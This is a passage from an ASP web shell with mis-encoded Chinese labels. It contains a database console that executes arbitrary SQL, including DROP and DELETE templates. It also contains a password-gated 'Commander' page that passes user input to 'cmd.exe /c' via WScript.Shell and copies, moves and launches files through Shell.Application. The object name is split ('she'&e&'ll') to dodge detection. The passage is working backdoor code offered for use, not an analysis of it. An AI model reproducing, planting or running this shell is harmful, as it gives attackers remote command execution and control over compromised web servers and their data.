	  Fox=Fox&"</tr>"
      Rs.MoveNext
    Loop
	
	Response.Write Fox:Fox=""
	
	SqlStr=HtmlEnCode(SqlStr)

    Fox=Fox&"<tr><td colspan="&FN+1&" align=center>��¼����"&RC&"&nbsp;ҳ�룺"&Page&"/"&PN
    If PN>1 Then
      Fox=Fox&"&nbsp;&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""",1)'>��ҳ</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page-1&")'>��һҳ</a>&nbsp;"
      If Page>8 Then:Sp=Page-8:Else:Sp=1:End if
      For i=Sp To Sp+8
        If i>PN Then Exit For
        If i=Page Then
        Fox=Fox&i&"&nbsp;"
        Else
        Fox=Fox&"<a href='javascript:FullSqlStr("""&SqlStr&""","&i&")'>"&i&"</a>&nbsp;"
        End If
      Next
	  Fox=Fox&"&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page+1&")'>��һҳ</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&PN&")'>βҳ</a>"
    End If
    Fox=Fox&"<hr color='#EFEFEF'></td></tr></table>"
    Rs.Close:Set Rs=Nothing
	
	Response.Write Fox:Fox=""
  Else	   
    Conn.Execute(SqlStr)
    Fox=Fox&"SQL��䣺"&SqlStr
  End If

  Response.Write Fox:Fox=""
End If

  Conn.Close
  Set Conn=Nothing
  End If
%>
<script language="javascript">
<!--
  function DbCheck(){
    if(DbForm.DbStr.value == ""){
	  alert("�����������ݿ�");
	  FullDbStr(0);
	  return false;
	}
	return true;
  }
  
  function FullDbStr(i){
   if(i<0){
     return false;
   }
    Str = new Array(12);  
	Str[0] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\db.mdb";
	Str[1] = "Driver={Sql Server};Server=<%=ServerIP%>,1433;Database=DbName;Uid=sa;Pwd=****";
	Str[2] = "Driver={MySql};Server=<%=ServerIP%>;Port=3306;Database=DbName;Uid=root;Pwd=****";
	Str[3] = "Dsn=DsnName";
	Str[4] = "SELECT * FROM [TableName] WHERE ID<100";
	Str[5] = "INSERT INTO [TableName](USER,PASS) VALUES(\'xpfox\',\'mypass\')";
	Str[6] = "DELETE FROM [TableName] WHERE ID=100";
	Str[7] = "UPDATE [TableName] SET USER=\'xpfox\' WHERE ID=100";
	Str[8] = "CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))";
	Str[9] = "DROP TABLE [TableName]";
	Str[10]= "ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)";
	Str[11]= "ALTER TABLE [TableName] DROP COLUMN PASS";
	Str[12]= "��ֻ��ʾһ������ʱ������ʾ�ֶε�ȫ���ֽڣ������������Ʋ�ѯʵ��.\n����һ������ֻ��ʾ�ֶε�ǰ��ʮ���ֽڡ�";
	if(i<=3){
	  DbForm.DbStr.value = Str[i];
	  DbForm.SqlStr.value = "";
	  abc.innerHTML="<center>��ȷ�ϼ��������ݿ�������SQL����������䡣</center>";
	}else if(i==12){
	  alert(Str[i]);
	}else{
	  DbForm.SqlStr.value = Str[i];
	}
	return true;
  } 
  
  
  function FullSqlStr(str,pg){
    if(DbForm.DbStr.value.length<5){
	  alert("�������ݿ����Ӵ��Ƿ���ȷ!")
	  return false;
	}
    if(str.length<10){
	  alert("����SQL����Ƿ���ȷ!")
	  return false;
	}
    DbForm.SqlStr.value = str ;
	DbForm.Page.value = pg;
	abc.innerHTML="";
	DbForm.submit();
    return true;
  }
-->
</script>
<%
end if
case "p.asp"%>
<%if Session("Security")="xpfox" then %>
<%response.write "Attention: Once one operation only<br>" %><font style="font-size:12px" face=Arial> Time:<%response.write now()%><BR>Physical Path:
<%response.write request.servervariables("APPL_PHYSICAL_PATH")%>
<html>
<title>Commander</title>
<body>
<%call css%>
</font><table border=0 width=600 cellspacing=0 cellpadding=0 style='word-break:break-all; font-size:10pt'>
<tr height=18><td align=left>
<form action="<%= Request.ServerVariables("URL") %>?q=p.asp" method="post">
·��: <input type=text name=text style="border:solid 1px" value="<%=DSnXA %>" size="20"> ����Ҫ�����Ŀ¼,���Ҫ�� "\"</span></td></tr><tr height=18><td align=left>
����: <input type=text name=text1 style="border:solid 1px" value="<%=DSnXA1 %>" size="20"> �� <input type=text name=text2 style="border:solid 1px" value="<%=DSnXA2 %>" size="20"> Ŀ�ĵ�ַ��Ҫ���ļ���</span></td></tr><tr height=18 class="noborder"><td align=left>
�ƶ�: <input type=text name=text3 style="border:solid 1px" value="<%=DSnXA3 %>" size="20"> �� <input type=text name=text4 style="border:solid 1px" value="<%=DSnXA4 %>" size="20"> Ŀ�ĵ�ַ��Ҫ���ļ���</span></td></tr><tr height=18 class="noborder"><td align=left>
·��: <input type=text name=text5 style="border:solid 1px" value="<%=DSnXA5 %>" size="20"> ����: <input type=text name=text6 style="border:solid 1px" value="<%=DSnXA6 %>" size="20"> �����ԼӲ���</span></td></tr><tr height=18 class="noborder"><td align=left><input type="text" style="border:solid 1px" name="ok" size=55> CMD����Ի���  </span></td></tr><tr height=18 class="noborder"><td align=left><input type=text style="border:solid 1px" name=pathlcx size=55> ·�����ļ���</span></font></td><tr height=18 class="noborder"><td align=left>
<textarea cols=80 rows=6 name=textlcx style="border:solid 1px">
<%
set oScript=Server.CreateObject("WScript.Shell")
ok=Request("ok")
if ok<>"" then response.write oScript.exec ("cmd.exe /c "& ok).stdout.readall
%></textarea> <input type=submit name=sb value="��������" class=input> </form></span></td></tr>
</table>
</center>
<% 
Response.Write request.form("cmd") & "<br><br>" 
Response.Write strResult 
DSnXA = Request.Form("text")
if (DSnXA <> "")  then
set shell=server.createobject("she"&e&"ll.application")
set fod1=shell.namespace(DSnXA)
set foditems=fod1.items
for each co in foditems
response.write "<font color=black>" & co.path & "-----" & co.size & "</font><br>"
next
end if
DSnXA1 = Request.Form("text1")
DSnXA2 = Request.Form("text2")
if DSnXA1<>"" and DSnXA2<>"" then
set shell1=server.createobject("she"&e&"ll.application")
set fod1=shell1.namespace(DSnXA2)
for i=len(DSnXA1) to 1 step -1
if mid(DSnXA1,i,1)="\" then
  path=left(DSnXA1,i-1)
  exit for
end if
next
if len(path)=2 then path=path & "\"
path2=right(DSnXA1,len(DSnXA1)-i)
set fod2=shell1.namespace(path)
set foditem=fod2.parsename(path2)
fod1.copyhere foditem
response.write "command success!"
end if
DSnXA3 = Request.Form("text3")
DSnXA4 = Request.Form("text4")
if DSnXA3<>"" and DSnXA4<>"" then
set shell2=server.createobject("she"&e&"ll.application")
set fod1=shell2.namespace(DSnXA4)

for i=len(DSnXA3) to 1 step -1
if mid(DSnXA3,i,1)="\" then
  path=left(DSnXA3,i-1)
  exit for
end if
next

if len(path)=2 then path=path & "\"
path2=right(DSnXA3,len(DSnXA3)-i)
set fod2=shell2.namespace(path)
set foditem=fod2.parsename(path2)
fod1.movehere foditem
response.write "command completed success!"
end if
DSnXA5 = Request.Form("text5")
DSnXA6 = Request.Form("text6")
if DSnXA5<>"" and DSnXA6<>"" then
set shell3=server.createobject("she"&e&"ll.application")
shell3.namespace(DSnXA5).items.item(DSnXA6).invokeverb
response.write "command completed success!"
end if
end if
%>
</pre></body>
<%
end select
function Epass(pass)
temppass=StrReverse(left(pass&"zxcvbnm,./",10))
templen=len(pass)
mmpassword=""
for j=1 to 10
mmpassword=mmpassword+chr(asc(mid(temppass,j,1))-templen+int(j*1.1))
next
Epass=replace(mmpassword,"'","B")
end function
%>